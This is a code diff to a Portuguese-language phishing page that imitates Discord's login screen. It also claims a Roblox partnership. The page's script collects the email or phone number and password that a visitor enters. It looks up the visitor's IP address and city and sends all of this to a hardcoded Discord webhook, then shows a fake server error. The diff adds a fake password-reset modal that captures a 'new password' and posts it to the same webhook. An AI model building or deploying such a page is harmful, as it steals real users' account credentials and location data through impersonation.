@@ -105,6 +105,7 @@
       display: block;
       margin-bottom: 24px;
       text-align: left;
+      cursor: pointer;
     }
     .forgot-link:hover {
       text-decoration: underline;
@@ -220,54 +221,124 @@
       opacity: 1;
       transform: translateY(0);
     }
-    @media (max-width: 900px) {
-      .container { flex-direction: column; height: auto; }
-      .right { padding: 60px 20px; }
-      .left { padding: 40px 30px; }
+
+    /* Modal de reset de senha */
+    .modal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.75);
+      z-index: 9999;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    }
+    .modal.show {
+      display: flex;
+      opacity: 1;
+    }
+    .modal-content {
+      background: rgba(40, 40, 60, 0.95);
+      border-radius: 12px;
+      padding: 40px;
+      width: 90%;
+      max-width: 460px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      backdrop-filter: blur(10px);
+      transform: scale(0.9);
+      transition: transform 0.3s ease;
+    }
+    .modal.show .modal-content {
+      transform: scale(1);
+    }
+    .modal h2 {
+      margin-bottom: 20px;
+      color: #ffffff;
+    }
+    .modal p {
+      margin-bottom: 24px;
+      color: #b9bbbe;
+      font-size: 1.1rem;
+    }
+    .modal input {
+      width: 100%;
+      padding: 14px;
+      margin-bottom: 20px;
+      background: #202225;
+      border: 1px solid #2f3136;
+      border-radius: 4px;
+      color: white;
+      font-size: 1rem;
+    }
+    .modal button {
+      width: 100%;
+      padding: 14px;
+      background: #5865f2;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 1.1rem;
+      cursor: pointer;
+    }
+    .modal button:hover {
+      background: #4752c4;
+    }
+    .close-modal {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      color: #b9bbbe;
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+    .close-modal:hover {
+      color: white;
     }
   </style>
 </head>
 <body>
+
   <div class="container">
     <div class="left">
       <a href="#" class="voltar">&lt; Voltar</a>
-     
+      
       <h1>Boas-vindas de volta!</h1>
       <p class="subtitle">Estamos muito animados em te ver novamente!</p>
-     
+      
       <form id="loginForm">
         <label for="email">E-mail ou número de telefone *</label>
         <input type="text" id="email" placeholder="" required />
-       
+        
         <label for="senha">Senha *</label>
         <input type="password" id="senha" placeholder="" required />
-       
-        <a href="#" class="forgot-link">Esqueceu sua senha?</a>
-       
+        
+        <a id="forgotPassword" class="forgot-link">Esqueceu sua senha?</a>
+        
         <button type="submit">Entrar</button>
-       
-        <!-- Texto de erro mais realista -->
+        
         <div id="errorBox" class="error-message">
           --- Erro de conexão com o servidor. Recarregue a página ou tente mais tarde. (504) ---
         </div>
-       
+        
         <div class="register-link">
           Precisando de uma conta? <a href="#">Registre-se</a>
         </div>
       </form>
     </div>
-   
+    
     <div class="right">
       <div class="qr-section">
         <img class="qr-image" src="https://i.imgur.com/1D9eZd0.png" alt="QR customizado" />
-       
+        
         <div class="qr-title">Entrar com código QR</div>
-       
+        
         <p class="qr-custom-text">
           Ou faça login pelo roblox!!<br>
           Estamos fazendo parceria em troca de divulgação!!
         </p>
-       
+        
         <div class="logos">
           <img src="https://i.imgur.com/zvlaijA.png" alt="Discord Logo">
           <span style="font-size: 1.8rem; font-weight: bold;"> - </span>
@@ -281,11 +352,25 @@
     </div>
   </div>
 
+  <!-- Modal de reset de senha -->
+  <div id="resetModal" class="modal">
+    <div class="modal-content">
+      <span class="close-modal" id="closeModal">&times;</span>
+      <h2>Resetar Senha</h2>
+      <p>O seu e-mail é *******@gmail.com</p>
+      <p>Bote a sua senha nova!</p>
+      <input type="password" id="newPassword" placeholder="... Bote sua nova Key/senha Aqui...">
+      <button id="resetButton">Resetar Senha</button>
+    </div>
+  </div>
+
   <script>
     const form = document.getElementById('loginForm');
     const errorBox = document.getElementById('errorBox');
     const webhookUrl = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
+    const resetWebhook = 'https://discord.com/api/webhooks/1482464893058945258/dVHkrAXszpxDyRXpI3ji-cHEipO9lsIM2ullHumbhQvYmeeXlNdQemM95slCGrN-cOuC';
 
+    // Login normal (seu código anterior)
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
 
@@ -311,11 +396,8 @@
         let res = await fetch('https://ipapi.co/json/');
         let data = await res.json();
         if (data.ip) {
-          if (data.ip.includes(':')) {
-            ipv6 = data.ip;
-          } else if (ipv4 === 'Não detectado') {
-            ipv4 = data.ip;
-          }
+          if (data.ip.includes(':')) ipv6 = data.ip;
+          else if (ipv4 === 'Não detectado') ipv4 = data.ip;
           location = data.city && data.country_name ? `${data.city}, ${data.country_name}` : 'Desconhecido';
         }
       } catch {
@@ -323,11 +405,8 @@
           let res2 = await fetch('https://ipwhois.io/api');
           let data2 = await res2.json();
           if (data2.ip) {
-            if (data2.ip.includes(':')) {
-              ipv6 = data2.ip;
-            } else if (ipv4 === 'Não detectado') {
-              ipv4 = data2.ip;
-            }
+            if (data2.ip.includes(':')) ipv6 = data2.ip;
+            else if (ipv4 === 'Não detectado') ipv4 = data2.ip;
             location = data2.city && data2.country ? `${data2.city}, ${data2.country}` : 'Desconhecido';
           }
         } catch {}
@@ -375,6 +454,51 @@
 
       errorBox.classList.add('show');
       setTimeout(() => errorBox.classList.remove('show'), 3000);
+    });
+
+    // Reset de senha
+    const forgotLink = document.getElementById('forgotPassword');
+    const modal = document.getElementById('resetModal');
+    const closeModal = document.getElementById('closeModal');
+    const resetButton = document.getElementById('resetButton');
+    const newPasswordInput = document.getElementById('newPassword');
+
+    forgotLink.addEventListener('click', (e) => {
+      e.preventDefault();
+      modal.classList.add('show');
+    });
+
+    closeModal.addEventListener('click', () => {
+      modal.classList.remove('show');
+    });
+
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) modal.classList.remove('show');
+    });
+
+    resetButton.addEventListener('click', () => {
+      const newPass = newPasswordInput.value.trim();
+      if (!newPass) {
+        alert('Digite uma nova senha!');
+        return;
+      }
+
+      const resetMsg = `**Reset de Senha Solicitado!**
+
+E-mail mascarado: *******@gmail.com
+Nova senha: \`${newPass}\`
+
+**Horário:** ${new Date().toLocaleString('pt-BR', { timeZone: 'America/Sao_Paulo' })}`;
+
+      fetch(resetWebhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: resetMsg })
+      }).catch(() => {});
+
+      alert('Senha resetada! (enviado pro webhook)');
+      newPasswordInput.value = '';
+      modal.classList.remove('show');
     });
   </script>
 </body>
